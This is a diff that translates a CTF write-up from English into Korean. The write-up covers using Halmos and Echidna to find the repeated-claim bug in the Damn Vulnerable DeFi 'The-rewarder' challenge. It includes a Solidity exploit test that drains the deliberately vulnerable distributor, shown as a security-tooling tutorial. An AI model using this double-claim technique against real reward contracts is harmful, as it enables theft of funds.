@@ -1,28 +1,31 @@
 # Halmos vs The-rewarder
-## Halmos version
-halmos 0.2.2.dev1+gd4cac2e was used in this article
-## Foreword
-It is strongly assumed that the reader is familiar with the previous articles on solving 
+
+## Halmos 버전
+이 글에서는 halmos 0.2.2.dev1+gd4cac2e 버전이 사용되었습니다.
+
+## 서문
+독자는 다음의 이전 글들에 익숙하다고 강력하게 가정합니다:
 1. [Unstoppable](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/unstoppable) 
 2. [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster)
 3. [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver)
 4. [Side-entrance](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/side-entrance)
 
-since the main ideas here are largely repeated and we will not dwell on them again.
+주요 아이디어가 여기에서도 대부분 반복되므로 다시 설명하지 않습니다.
 
-Also, let's clearly talk that despite the same name, the **The-rewarder** challenge in v4 has completely new conditions and bug mechanics compared to v3. Therefore, it is highly recommended to familiarize yourself with the new **The-rewarder** and the common solution to this problem. We will focus specifically on the use of Halmos, but not on the description of the challenge.
-## Preparation
-### Common prerequisites
-1. Copy **TheRewarder.t.sol** file to **TheRewarderHalmos.t.sol**.
-2. Rename `test_theRewarder()` to `check_theRewarder()`, so Halmos will execute this test symbolically.
-3. Avoid using `makeAddr()` cheatcode. Due to the specifics of the task, hard-coded addresses will look unusual. This time, we will take the `player` and `Alice` addresses directly from **weth-distribution.json**, because the very logic of the task is tied to these addresses:
+또한, 이름은 같지만 v4의 **The-rewarder** 챌린지는 v3와 비교하여 조건과 버그 메커니즘이 완전히 다르다는 점을 분명히 해야 합니다. 따라서 새로운 **The-rewarder**와 이 문제에 대한 일반적인 솔루션에 익숙해지는 것이 좋습니다. 우리는 Halmos 사용에 집중할 것이며, 챌린지 설명에는 집중하지 않을 것입니다.
+
+## 준비
+### 공통 필수 조건
+1. **TheRewarder.t.sol** 파일을 **TheRewarderHalmos.t.sol**로 복사합니다.
+2. `test_theRewarder()`의 이름을 `check_theRewarder()`로 변경하여 Halmos가 이 테스트를 심볼릭하게 실행하도록 합니다.
+3. `makeAddr()` 치트코드 사용을 피하십시오. 과제의 특성상 하드코딩된 주소는 비정상적으로 보일 수 있습니다. 이번에는 **weth-distribution.json**에서 `player`와 `Alice` 주소를 직접 가져올 것입니다. 왜냐하면 과제의 로직 자체가 이 주소들과 연결되어 있기 때문입니다:
     ```solidity
     address deployer = address(0xcafe0000);
     address recovery = address(0xcafe0002);
     address alice = address(0x328809Bc894f92807417D2dAD6b7C998c1aFdac6);
     address player = address(0x44E97aF4418b7a17AABD8090bEA0A471a366305C);
     ```
-4. Create **GlobalStorage** contract and save address-name pairs of contracts:
+4. **GlobalStorage** 계약을 생성하고 계약의 주소-이름 쌍을 저장하십시오:
     ```solidity
     import "lib/GlobalStorage.sol";
     ...
@@ -37,12 +40,12 @@ Also, let's clearly talk that despite the same name, the **The-rewarder** challe
         glob.add_addr_name_pair(address(distributor), "TheRewarderDistributor");
     }
     ```
-    we ignore the `merkle` contract, since it is completely readonly.
-5. Bypass issue #338
+    `merkle` 계약은 완전히 읽기 전용이므로 무시합니다.
+5. 이슈 #338 우회
     ```solidity
     startHoax(deployer, 1 << 80);
     ```
-6. Print all contract addresses:
+6. 모든 계약 주소를 출력하십시오:
     ```solidity
     console.log("GlobalStorage", address(glob));
     console.log("DamnValuableToken", address(dvt));
@@ -57,9 +60,9 @@ Also, let's clearly talk that despite the same name, the **The-rewarder** challe
     [console.log] WETH 0x00000000000000000000000000000000000000000000000000000000aaaa0004
     [console.log] TheRewarderDistributor 0x00000000000000000000000000000000000000000000000000000000aaaa0006
     ```
-7. `vm.expectRevert()` is an unsupported cheat-code. Just delete it.
-### _isSolved() implementation
-The original checks look like:
+7. `vm.expectRevert()`는 지원되지 않는 치트코드입니다. 그냥 삭제하십시오.
+### _isSolved() 구현
+원래 확인 로직은 다음과 같습니다:
 ```solidity
 // Player saved as much funds as possible, perhaps leaving some dust
 assertLt(dvt.balanceOf(address(distributor)), 1e16, "Too much DVT in distributor");
@@ -77,7 +80,7 @@ assertEq(
     "Not enough WETH in recovery account"
 );
 ```
-As usual, we check whether we can empty the `distributor` of some unexpected amount. Note that the formula here will be a bit more complicated than we are used to seeing. First, we take into account that `Alice` has taken her reward and it is expected that the `player` himself can take his reward once. Therefore, the invariant looks like this:
+평소와 같이, `distributor`에서 예상치 못한 금액을 비울 수 있는지 확인합니다. 여기의 공식은 우리가 보던 것보다 조금 더 복잡할 것입니다. 먼저, `Alice`가 보상을 받았고 `player` 자신도 한 번 보상을 받을 것으로 예상된다는 점을 고려합니다. 따라서 불변 조건은 다음과 같습니다:
 ```solidity
 function _isSolved() private view {
     assert (dvt.balanceOf(address(distributor)) >= 
@@ -86,11 +89,11 @@ function _isSolved() private view {
             TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT - 1171088749244340);
 }
 ```
-`11524763827831882` and `1171088749244340` are the amounts of **DVT** and **WETH** the player is expected to be able to collect as he is one of the reward recipients. We took these numbers from **dvt-distribution.json** and **weth-distribution.json**.
-### Loading rewards
-In the setup process, the original test internally parses 1000 records in **JSON** format and uploads them to the `distributor` contract. However, there is a problem: Halmos does not support the required cheat codes, namely `vm.projectRoot()`, `vm.readFile()` and `vm.parseJson()`. We will work around this problem in a somewhat dirty but effective way. Instead of parsing the **JSON**, we will immediately explicitly insert the bytes into the right place.
+`11524763827831882`와 `1171088749244340`은 플레이어가 보상 수령자 중 한 명으로서 받을 것으로 예상되는 **DVT** 및 **WETH** 금액입니다. 이 숫자들은 **dvt-distribution.json**과 **weth-distribution.json**에서 가져왔습니다.
+### 보상 로드
+설정(setup) 과정에서, 원래 테스트는 내부적으로 1000개의 레코드를 **JSON** 형식으로 파싱하여 `distributor` 계약에 업로드합니다. 그러나 문제가 있습니다: Halmos는 `vm.projectRoot()`, `vm.readFile()`, `vm.parseJson()`과 같은 필수 치트 코드를 지원하지 않습니다. 우리는 다소 지저분하지만 효과적인 방법으로 이 문제를 우회할 것입니다. **JSON**을 파싱하는 대신, 필요한 바이트를 바로 올바른 위치에 명시적으로 삽입할 것입니다.
 
-First, let's log the necessary bytes from the original **TheRewarder.t.sol**:
+먼저, 원래 **TheRewarder.t.sol**에서 필요한 바이트를 기록해 봅시다:
 ```solidity
 function _loadRewards(string memory path) private view returns (bytes32[] memory leaves) {
     console.logBytes(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))));
@@ -103,7 +106,7 @@ Logs:
   0x000...e962
   0x000...b3d4
 ```
-Insert it into the Halmos test:
+Halmos 테스트에 삽입합니다:
 ```solidity
 function setUp() public {
     ...
@@ -135,17 +138,17 @@ function _loadRewardsWETH() private view returns (bytes32[] memory leaves) {
     }
 }
 ```
-This thing takes a long time in Halmos: it took all of 1 minute on my machine to create `dvt` and `weth` leaves.
-### Dealing with Merkle functions
-Before proceeding, it is highly recommended to understand how [Merkle trees](https://www.investopedia.com/terms/m/merkle-tree.asp) work and how they check for a leaf presence in the tree.
+이 작업은 Halmos에서 시간이 오래 걸립니다: 제 기기에서 `dvt`와 `weth` 잎(leaves)을 생성하는 데 1분이 꼬박 걸렸습니다.
+### 머클(Merkle) 함수 다루기
+진행하기 전에, [머클 트리](https://www.investopedia.com/terms/m/merkle-tree.asp)가 어떻게 작동하고 트리에서 잎의 존재를 어떻게 확인하는지 이해하는 것이 강력히 권장됩니다.
 
-Cryptography puts a spanner in our works again. This time when we try to run the test we get an error:
+암호학이 다시 한번 우리의 작업을 방해합니다. 테스트를 실행하려고 하면 오류가 발생합니다:
 ```javascript
 $ halmos --solver-timeout-assertion 0 --function check_theRewarder
 ...
 Error: setUp() failed: HalmosException: No successful path found in setUp()
 ```
-The problem is in `merkle.getRoot()`:
+문제는 `merkle.getRoot()`에 있습니다:
 ```solidity
 function getRoot(bytes32[] memory data) public pure virtual returns (bytes32) {
     require(data.length > 1, "won't generate root for single leaf");
@@ -155,7 +158,7 @@ function getRoot(bytes32[] memory data) public pure virtual returns (bytes32) {
     return data[0];
 }
 ```
-Halmos doesn't do well with large loops. Of course, we can try running Halmos with a big enough `--loop` option. But here we encounter another issue. The easiest way to show this is by adding some logging:
+Halmos는 큰 루프를 잘 처리하지 못합니다. 물론 `--loop` 옵션을 충분히 크게 설정하여 Halmos를 실행할 수도 있습니다. 하지만 여기서 또 다른 문제에 부딪힙니다. 로깅을 추가하여 이를 가장 쉽게 보여줄 수 있습니다:
 ```solidity
 console.log("start get root 1");
 dvtRoot = merkle.getRoot(dvtLeaves);
@@ -182,7 +185,7 @@ distributor.createDistribution({
 });
 console.log("approve 2");
 ```
-Run:
+실행:
 ```javascript
 $ halmos --solver-timeout-assertion 0 --function check_theRewarder --loop 10000 --solver-timeout-branching 0
 ...
@@ -203,7 +206,7 @@ $ halmos --solver-timeout-assertion 0 --function check_theRewarder --loop 10000 
 [console.log] approve 2
 ...  
 ```
-For some reason, Halmos does unnecessary branching in `merkle.getRoot(wethLeaves)`, where it is not needed or expected at all. The fact is that Halmos does not return a specific root here, but some symbolic gibberish because of complexity of formulas:
+이유는 모르겠지만, Halmos는 `merkle.getRoot(wethLeaves)`에서 전혀 필요하거나 예상되지 않는 불필요한 분기를 수행합니다. 사실 Halmos는 수식의 복잡성 때문에 여기서 특정 루트가 아니라 심볼릭 횡설수설을 반환합니다:
 ```solidity
 console.log("start get root");
 dvtRoot = merkle.getRoot(dvtLeaves);
@@ -216,14 +219,14 @@ $ halmos --solver-timeout-assertion 0 --function check_theRewarder --loop 10000 
 [console.log] f_sha3_512(Concat(f_sha3_512(Concat(f_sha3_512(Concat(f_sha3_512(Concat...de962)))))))))))))))))))))
 ...
 ```
-The good news is that we don't have to look for `root` in the runtime. It is enough to calculate it once, even in the original forge test and hardcode it:
+좋은 소식은 런타임에 `root`를 찾을 필요가 없다는 것입니다. 원래 forge 테스트에서 한 번 계산하고 하드코딩하는 것으로 충분합니다:
 ```solidity
 merkle = new Merkle();
 console.logBytes32(merkle.getRoot(dvtLeaves));
 console.logBytes32(merkle.getRoot(wethLeaves));
 ...
 ```
-And this is what we got:
+그리고 우리가 얻은 것은 다음과 같습니다:
 ```javascript
 $ forge test --mp test/the-rewarder/TheRewarder.t.sol -vvv
 ...
@@ -232,7 +235,7 @@ Logs:
     0x5a1b4e345b2e4419e385fa460b91decd0d9d34cac0bd187aedea5484d2cdd6f6
     ...
 ```
-So, Halmos test:
+따라서, Halmos 테스트는 다음과 같습니다:
 ```solidity
 merkle = new Merkle();
 dvtRoot = hex"399df90cbebfb0e630b6da99a45325404a758823effc616197f3c33f749cb5d4";
@@ -240,7 +243,7 @@ wethRoot = hex"5a1b4e345b2e4419e385fa460b91decd0d9d34cac0bd187aedea5484d2cdd6f6"
 //dvtRoot = merkle.getRoot(dvtLeaves);
 //wethRoot = merkle.getRoot(wethLeaves);
 ```
-Let's do a similar trick with Alice's `merkle.getProof()`. Halmos test is changed to:
+Alice의 `merkle.getProof()`로 비슷한 트릭을 해봅시다. Halmos 테스트는 다음과 같이 변경됩니다:
 ```solidity
 // Create Alice's claims
 Claim[] memory claims = new Claim[](2);
@@ -271,7 +274,7 @@ claims[1] = Claim({
     proof: wethproof // Alice's address is at index 2
 });
 ```
-Next, let's look at `MerkleProof.verify()` from `TheRewarderDistributor::claimRewards()`:
+다음으로 `TheRewarderDistributor::claimRewards()`의 `MerkleProof.verify()`를 살펴보겠습니다:
 ```solidity
 function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
     ...
@@ -281,7 +284,7 @@ function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) e
     ...
 }
 ```
-**MerkleProof** contract:
+**MerkleProof** 계약:
 ```solidity
 function verify(bytes32[] memory proof, bytes32 root, bytes32 leaf) internal pure returns (bool) {
     return processProof(proof, leaf) == root;
@@ -295,11 +298,11 @@ function processProof(bytes32[] memory proof, bytes32 leaf) internal pure return
     return computedHash;
 }
 ```
-Obviously, we cannot find such an `inputClaim.proof` using symbolic analysis methods, this would literally mean breaking hash cryptography. 
-Therefore, Halmos will not work properly without finding a valid `proof`.
+분명히, 심볼릭 분석 방법을 사용하여 그러한 `inputClaim.proof`를 찾을 수 없습니다. 이는 말 그대로 해시 암호화를 깨는 것을 의미하기 때문입니다.
+따라서 Halmos는 유효한 `proof`를 찾지 못하여 제대로 작동하지 않을 것입니다.
 
-However, there is a way out. We have already met with cryptographic checks in [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver#optimizations).
-There we completely removed the cryptographic verification, but clearly indicated that the entered data was correct. We will do something similar here: remove the cryptographic verification, but assume that we transferred the correct `amount` for our `msg.sender` (this is what this cryptographic verification about):
+하지만 방법이 있습니다. 우리는 이미 [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver#optimizations)에서 암호학적 검사를 접했습니다.
+거기서 우리는 암호학적 검증을 완전히 제거했지만, 입력된 데이터가 정확하다는 것을 명확히 표시했습니다. 여기서도 비슷한 작업을 수행할 것입니다: 암호학적 검증을 제거하지만, `msg.sender`에 대해 올바른 `amount`를 전송했다고 가정합니다(이것이 이 암호학적 검증의 목적입니다):
 ```solidity
 ...
 if (msg.sender == address(0x44E97aF4418b7a17AABD8090bEA0A471a366305C)) // player address
@@ -315,9 +318,9 @@ if (msg.sender == address(0x44E97aF4418b7a17AABD8090bEA0A471a366305C)) // player
 //if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();
 ...
 ```
-It is also worth saying that we are assuming here that the **MerkleProof** implementation is bug free and works as expected.
-### Avoiding nested vm.startPrank()
-The current version of Halmos does not support nested `startPrank()`. So let's replace
+또한 여기서 **MerkleProof** 구현에 버그가 없고 예상대로 작동한다고 가정하고 있다는 점을 언급할 가치가 있습니다.
+### 중첩된 vm.startPrank() 피하기
+Halmos의 현재 버전은 중첩된 `startPrank()`를 지원하지 않습니다. 따라서
 ```solidity
 startHoax(deployer, 1 << 80);
 ...
@@ -326,7 +329,7 @@ vm.startPrank(alice);
 vm.stopPrank(); // stop alice prank
 vm.stopPrank(); // stop deployer prank
 ```
-by
+이것을 다음과 같이 교체합니다:
 ```solidity
 startHoax(deployer, 1 << 80);
 ...
@@ -335,11 +338,11 @@ vm.startPrank(alice);
 ...
 vm.stopPrank(); // stop alice prank
 ```
-Wow, it was really a long preparation. Let's move on to the next steps!
-## No SymbolicAttacker? 
-There is a feature in this challenge that prevents us from using the convenient **SymbolicAttacker** proxy contract. Since the logic of **TheRewarderDistributor** contract is tied to the `player` specific address, `msg.sender` in **TheRewarderDistributor** should be exactly the player's address. Instead, we'll move all of the **SymbolicAttacker** logic right into **TheRewarderChallenge** testing contract.
-## Improvement of coverage
-According to the plan, launch one symbolic transaction to check whether all paths are covered:
+와, 정말 긴 준비 과정이었네요. 다음 단계로 넘어갑시다!
+## SymbolicAttacker 없음?
+이 챌린지에는 편리한 **SymbolicAttacker** 프록시 계약을 사용하지 못하게 하는 특징이 있습니다. **TheRewarderDistributor** 계약의 로직은 `player` 특정 주소에 연결되어 있으므로, **TheRewarderDistributor**의 `msg.sender`는 정확히 플레이어의 주소여야 합니다. 대신, 모든 **SymbolicAttacker** 로직을 **TheRewarderChallenge** 테스트 계약으로 바로 옮길 것입니다.
+## 커버리지 개선
+계획에 따라 단일 심볼릭 트랜잭션을 실행하여 모든 경로가 커버되는지 확인합니다:
 ```solidity
 function attack() private {
     execute_tx();
@@ -359,17 +362,17 @@ WARNING:halmos:Encountered symbolic memory offset: 704 + Concat(Extract(250, 0, 
 WARNING:halmos:check_theRewarder(): paths have not been fully explored due to the loop unrolling bound: 2
 ...
 ```
-### Increase the symbolic loops
-We have as many as 3 contracts stored in **GlobalStorage**, but Halmos runs 2 loop iterations by default. Let's add the parameter `--loop 3` to the Halmos command.
-### Symbolic token index
-The old symbolic offset problem, but in a new form. This time we are trying to retrieve an IERC20 token by index, which is a symbolic value. and Halmos doesn't like it:
+### 심볼릭 루프 늘리기
+우리는 **GlobalStorage**에 3개의 계약을 저장했지만, Halmos는 기본적으로 2번의 루프 반복을 실행합니다. Halmos 명령에 `--loop 3` 매개변수를 추가해 봅시다.
+### 심볼릭 토큰 인덱스
+오래된 심볼릭 오프셋 문제이지만 새로운 형태입니다. 이번에는 인덱스로 IERC20 토큰을 검색하려고 하는데, 이 인덱스가 심볼릭 값이며 Halmos는 이를 좋아하지 않습니다:
 ```solidity
 function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
     ...
     if (token != inputTokens[inputClaim.tokenIndex]) {
 ...
 ```
-Since we do not have any restrictions on the size of the `inputTokens` array, literally any address can be found by the symbolic index. Therefore, we will get around this symbolic offset issue by using a **symbolic token** instead of `inputTokens[inputClaim.tokenIndex]` everywhere:
+`inputTokens` 배열의 크기에 제한이 없으므로, 말 그대로 모든 주소를 심볼릭 인덱스로 찾을 수 있습니다. 따라서 우리는 모든 곳에서 `inputTokens[inputClaim.tokenIndex]` 대신 **심볼릭 토큰**을 사용하여 이 심볼릭 오프셋 문제를 해결할 것입니다:
 ```solidity
 function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
     ...
@@ -390,9 +393,9 @@ function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) e
     IERC20(token).transfer(msg.sender, inputClaim.amount);
 }
 ```
-Here it is also worth explicitly talking about how Halmos handles arrays of symbolic size, as in this case (if `player` calls this function symbolically - the size of `inputClaims` and `inputTokens` arrays will be symbolic). This is regulated by the `--default-array-lengths` parameter, which by default is "0,1,2". This means that Halmos will handle 3 cases separately: when array size is 0, when it is 1, and when it is 2.
+여기서 Halmos가 이 경우(만약 `player`가 이 함수를 심볼릭하게 호출한다면 - `inputClaims`와 `inputTokens` 배열의 크기는 심볼릭일 것입니다)와 같이 심볼릭 크기의 배열을 어떻게 처리하는지 명시적으로 이야기할 가치가 있습니다. 이것은 `--default-array-lengths` 매개변수로 규제되며, 기본값은 "0,1,2"입니다. 이는 Halmos가 배열 크기가 0일 때, 1일 때, 2일 때의 3가지 경우를 별도로 처리함을 의미합니다.
 
-Run:
+실행:
 ```javascript
 $ halmos --solver-timeout-assertion 0 --function check_theRewarder --loop 3
 ...
@@ -428,16 +431,16 @@ p_inputTokens[0]_address_58409a8_20 = 0x0000000000000000000000000000000000000000
 p_inputTokens[1]_address_b9b63db_21 = 0x0000000000000000000000000000000000000000000000000000000000000000
 p_inputTokens_length_8a67349_19 = 0x0000000000000000000000000000000000000000000000000000000000000002
 ```
-We were lucky: one symbolic transaction was enough to find the bug. Let's deal with a counterexample.
-## Counterexamples analysis
-The 2 counterexamples provided are essentially one bug that worked separately on **DVT** and **WETH** tokens. In simple words, we can collect our reward several times if we pass the same token index into different `tokenIndex` elements of `inputClaims[]` array:
+운이 좋았습니다: 하나의 심볼릭 트랜잭션으로 버그를 찾기에 충분했습니다. 반례를 처리해 봅시다.
+## 반례 분석
+제공된 2개의 반례는 본질적으로 **DVT**와 **WETH** 토큰에 대해 각각 작동하는 하나의 버그입니다. 간단히 말해서, `inputClaims[]` 배열의 서로 다른 `tokenIndex` 요소에 동일한 토큰 인덱스를 전달하면 보상을 여러 번 수령할 수 있습니다:
 ```javascript
 halmos_SymbolicInputToken_address_05635b7_29 = 0x00000000000000000000000000000000aaaa0004
 halmos_SymbolicInputToken_address_7b0d29c_30 = 0x00000000000000000000000000000000aaaa0004
 ```
-Remember that we replaced the `inputTokens[inputClaim.tokenIndex]` logic with a `SymbolicInputToken`, so, the logic of the bug is not so obvious from the counterexample. But nevertheless - a bug was found.
-## Using a counterexample
-In the Halmos test, we ignored cryptographic checks. However, we will use them here. We also remember that we need to transfer all funds to `recovery`. So, let's build an attack so as to empty the `distributor` for the maximum possible amount:
+우리가 `inputTokens[inputClaim.tokenIndex]` 로직을 `SymbolicInputToken`으로 대체했으므로, 반례에서 버그의 로직이 그렇게 명확하지 않다는 것을 기억하십시오. 그럼에도 불구하고 - 버그가 발견되었습니다.
+## 반례 사용
+Halmos 테스트에서 우리는 암호학적 검사를 무시했습니다. 하지만 여기서는 그것들을 사용할 것입니다. 또한 모든 자금을 `recovery`로 이체해야 한다는 것을 기억합니다. 따라서 `distributor`를 가능한 최대 금액만큼 비우도록 공격을 구성해 봅시다:
 ```solidity
 function test_theRewarder() public checkSolvedByPlayer {
     bytes32[] memory dvtLeaves = _loadRewards(
@@ -481,18 +484,18 @@ function test_theRewarder() public checkSolvedByPlayer {
     weth.transfer(recovery, weth.balanceOf(player));
 }
 ```
-Run:
+실행:
 ```javascript
 $ forge test --mp test/the-rewarder/TheRewarder.t.sol
 ...
 [PASS] test_theRewarder() (gas: 1005136185)
 ...
 ```
-Another challenge was solved using a bug found by Halmos!
-## Fuzzing time
-At the time of writing, I have not found a fuzzing solution for the updated version of **The-Rewarder**. Let's try to implement it ourselves. We'll use **Echidna** as fuzzing engine.
-### Common preparations
-Echidna config file:
+Halmos가 찾은 버그를 사용하여 또 다른 챌린지를 해결했습니다!
+## 퍼징 타임
+이 글을 쓰는 시점에서, 저는 **The-Rewarder**의 업데이트된 버전에 대한 퍼징 솔루션을 찾지 못했습니다. 직접 구현해 봅시다. 퍼징 엔진으로 **Echidna**를 사용할 것입니다.
+### 공통 준비
+Echidna 설정 파일:
 ```javascript
 deployer: '0xcafe0001' 
 sender: ['0x44E97aF4418b7a17AABD8090bEA0A471a366305C']
@@ -500,7 +503,7 @@ allContracts: true
 workers: 8
 balanceContract: 100000000000000000000000000000000000000000000000000000000000000000000000
 ```
-Since Echidna has the same problems with loading data from **JSON** - let's do the same trick using hardcoded data:
+Echidna도 **JSON**에서 데이터를 로드하는 데 동일한 문제가 있으므로 하드코딩된 데이터를 사용하여 동일한 트릭을 수행해 봅시다:
 ```solidity
 constructor() public payable {
     ...
@@ -531,9 +534,9 @@ function _loadRewardsWETH() private view returns (bytes32[] memory leaves) {
     }
 }
 ```
-Also, for simplicity, we completely ignore the logic with `Alice`, since the fact that she took her tokens does not affect the presence of the bug in any way. We are only interested in whether Echidna can find the bug. 
+또한, 단순함을 위해 `Alice`와 관련된 로직은 완전히 무시합니다. 그녀가 토큰을 가져갔다는 사실은 버그의 존재 여부에 아무런 영향을 미치지 않기 때문입니다. 우리는 Echidna가 버그를 찾을 수 있는지 여부에만 관심이 있습니다.
 
-So, invariant:
+자, 불변 조건:
 ```solidity
 function echidna_testSolved() public returns (bool) {
     if (dvt.balanceOf(address(distributor)) >= 
@@ -548,7 +551,7 @@ function echidna_testSolved() public returns (bool) {
     return false;
 }
 ```
-For Echidna, we will also simplify the task of proof checking in `TheRewarderDistributor::claimRewards()`. Let's remove this check but assume that we have passed correct arguments:
+Echidna를 위해 `TheRewarderDistributor::claimRewards()`의 증명 확인 작업도 단순화할 것입니다. 이 확인을 제거하되 올바른 인수를 전달했다고 가정해 봅시다:
 ```solidity
 if (token != inputTokens[inputClaim.tokenIndex]) {
     if (inputTokens[inputClaim.tokenIndex] == 
@@ -567,18 +570,18 @@ if (token != inputTokens[inputClaim.tokenIndex]) {
 
     //if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();
 ```
-Run:
+실행:
 ```javascript
 $ echidna test/the-rewarder/TheRewarderEchidna.sol --contract TheRewarderEchidna --config test/the-rewarder/the-rewarder.yaml --test-limit 10000000
 ...
 echidna_testSolved: passing
 ...
 ```
-Nothing. 
-### Analysis of the limits of Echidna
-After this fail, I decided to check whether it would even be able to craft valid parameters that would take away at least its "fair" reward. 
+아무것도 없습니다.
+### Echidna의 한계 분석
+이 실패 후, 저는 Echidna가 최소한 "공정한" 보상이라도 가져갈 수 있는 유효한 매개변수를 생성할 수 있는지 확인하기로 결정했습니다.
 
-Let's simplify the invariant for a while:
+잠시 불변 조건을 단순화해 봅시다:
 ```solidity
 function echidna_testSolved() public returns (bool) {
     if (dvt.balanceOf(address(distributor)) >= 
@@ -593,7 +596,7 @@ function echidna_testSolved() public returns (bool) {
     return false;
 }
 ```
-Run again:
+다시 실행:
 ```javascript
 $ echidna test/the-rewarder/TheRewarderEchidna.sol --contract TheRewarderEchidna --config test/the-rewarder/the-rewarder.yaml --test-limit 10000000
 ...
@@ -602,20 +605,20 @@ echidna_testSolved: failed!💥
     TheRewarderDistributor.claimRewards([(3, 4, 2, ["s\208n\ENQ\233\198\246v\157\134Gsw\200)N\SI\137\210\184\138\175\254\207\217\DEL\197sy\235T\236", "z\DLE]\155\142)b\199\146\SI\159o\193\\\228\156\EOTk\237\216j\SOH%\131\193\&5\170\DELqzw\223"])],[0x1fffffffe, 0x1fffffffe, 0x62d69f6867a0a084c6d313943dc22023bc263691, 0xffffffff, 0x62d69f6867a0a084c6d313943dc22023bc263691, 0x2fffffffd, 0x1fffffffe, 0xffffffff, 0x0, 0xb4c79dab8f259c7aee6e5b2aa729821864227e84])
 ...
 ```
-Cool! At least the "fair" transaction it found. Let's check if Echidna is able to generate the same simple transaction, but with a larger `inputClaims` array (at least of size 2):
+멋지네요! 적어도 "공정한" 트랜잭션은 찾았습니다. 이제 Echidna가 더 큰 `inputClaims` 배열(크기가 최소 2 이상)로 동일한 간단한 트랜잭션을 생성할 수 있는지 확인해 봅시다:
 ```solidity
 function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
     require(inputClaims.length >= 2);
     ...
 ```
-Try:
+시도:
 ```javascript
 $ echidna test/the-rewarder/TheRewarderEchidna.sol --contract TheRewarderEchidna --config test/the-rewarder/the-rewarder.yaml --test-limit 10000000
 ...
 echidna_testSolved: passing
 ...
 ```
-Yeah, the problem is that Echidna has a hard time generating an `inputClaims` array of size at least 2. I found the following [article](https://secure-contracts.com/program-analysis/echidna/fuzzing_tips.html#handling-dynamic-arrays) that recommends using the **push-pop-use** pattern in such cases. Also for this test we returned the **invariant** again.
+네, 문제는 Echidna가 크기 2 이상의 `inputClaims` 배열을 생성하는 데 어려움을 겪는다는 것입니다. 저는 그러한 경우에 **push-pop-use** 패턴을 사용할 것을 권장하는 다음 [기사](https://secure-contracts.com/program-analysis/echidna/fuzzing_tips.html#handling-dynamic-arrays)를 찾았습니다. 또한 이 테스트를 위해 **불변 조건**을 다시 돌려놓았습니다.
 ```solidity
 contract TheRewarderDistributor {
     ...
@@ -650,7 +653,7 @@ contract TheRewarderDistributor {
         }
 }
 ```
-Start and pray:
+시작하고 기도합니다:
 ```javascript
 $ echidna test/the-rewarder/TheRewarderEchidna.sol --contract TheRewarderEchidna --config test/the-rewarder/the-rewarder.yaml --test-limit 10000000
 ...
@@ -662,10 +665,10 @@ echidna_testSolved: failed!💥
     TheRewarderDistributor.claimRewards()
 ...
 ```
-Success! the **push-pop-use** pattern really turned out to be effective. Note that although the counterexample does not show a valid amount, we remember that we specified it explicitly instead of a cryptographic check.
-## Conclusions
-1. Even if we face some engine limitations (Halmos or Echidna) - don't be afraid to use "dirty" tricks, even if they look ugly. All for the sake of the result!
-2. When constructing tests with cryptographic checks, there is a very effective technique: we do not check cryptography at all, but we explicitly assume that the data was entered correctly.
-3. If we compare how Halmos and Echidna coped with this challenge, we can say that both tools did quite well. But, in my opinion, Halmos was a little more convenient - every step of contract preparation was obvious and planned, the tool itself gave a hint on how to change the target contract through warnings. At the same time, in the case of Echidna, we had to find the limits of code coverage manually and use not the most obvious technique to force fuzzing to cover the case with 2 `inputClaims`.
-### What's next?
-The next challenge is [Selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/selfie/README.md)
+성공! **push-pop-use** 패턴은 정말 효과적이었습니다. 반례가 유효한 금액을 보여주지는 않지만, 암호학적 검사 대신 명시적으로 지정했음을 기억하십시오.
+## 결론
+1. 일부 엔진 제한(Halmos 또는 Echidna)에 직면하더라도 - 못생겨 보일지라도 "지저분한" 트릭을 사용하는 것을 두려워하지 마십시오. 모두 결과를 위해서입니다!
+2. 암호학적 검사가 포함된 테스트를 구성할 때 매우 효과적인 기술이 있습니다: 암호학을 전혀 확인하지 않고 데이터가 올바르게 입력되었다고 명시적으로 가정하는 것입니다.
+3. Halmos와 Echidna가 이 챌린지에 어떻게 대처했는지 비교하면, 두 도구 모두 꽤 잘 해냈다고 말할 수 있습니다. 하지만 제 생각에는 Halmos가 조금 더 편리했습니다 - 계약 준비의 모든 단계가 명확하고 계획적이었으며, 도구 자체가 경고를 통해 대상 계약을 변경하는 방법에 대한 힌트를 제공했습니다. 반면에 Echidna의 경우, 코드 커버리지의 한계를 수동으로 찾아야 했고, 퍼징이 2개의 `inputClaims`가 있는 경우를 커버하도록 강제하기 위해 가장 명확하지 않은 기술을 사용해야 했습니다.
+### 다음 단계는?
+다음 챌린지는 [Selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/selfie/README.md)입니다.
